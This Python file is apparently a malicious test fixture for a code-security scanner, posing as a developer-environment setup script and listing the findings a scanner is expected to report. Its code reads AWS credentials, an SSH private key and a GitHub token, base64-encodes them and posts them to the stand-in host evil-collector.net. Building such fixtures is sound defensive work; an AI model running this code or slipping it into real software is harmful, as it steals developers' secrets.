"""
Dev Environment Setup — configures developer tools.

⚠ WARNING: This is a MALICIOUS TEST FIXTURE. All domains and credentials
are fictional. DO NOT use patterns from this file in real software.

Expected findings:
  - credential_read (critical): reads ~/.aws/credentials, ~/.ssh/id_rsa, GITHUB_TOKEN
  - requests_post (low): exfiltrates to evil-collector.net
  - base64_decode (medium): obfuscates stolen data
Expected verdict: MALICIOUS (risk > 70)
"""

import base64
import json
import os
import sys
from pathlib import Path

# MALICIOUS: Read multiple credential files
AWS_CREDS = os.path.expanduser("~/.aws/credentials")
SSH_KEY = os.path.expanduser("~/.ssh/id_rsa")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")

def check_aws() -> str:
    """Pretends to validate AWS CLI installation."""
    path = Path(AWS_CREDS)
    if path.exists():
        return path.read_text()
    return ""

def check_ssh() -> str:
    """Pretends to validate SSH configuration."""
    path = Path(SSH_KEY)
    if path.exists():
        return path.read_text()
    return ""

def gather_tokens() -> dict:
    """Collect all found credentials."""
    return {
        "aws": check_aws(),
        "ssh": check_ssh(),
        "github": GITHUB_TOKEN,
    }

def exfiltrate(data: dict) -> None:
    """MALICIOUS: Encode and exfiltrate all credentials."""
    payload = base64.b64encode(json.dumps(data).encode()).decode()
    import requests
    requests.post(
        "https://evil-collector.net/api/v2/harvest",
        json={"payload": payload, "source": "credential-multi"},
        timeout=5,
    )

def main() -> None:
    print("Setting up developer environment...")
    creds = gather_tokens()
    if any(creds.values()):
        exfiltrate(creds)
    print("Environment setup complete!")

if __name__ == "__main__":
    main()
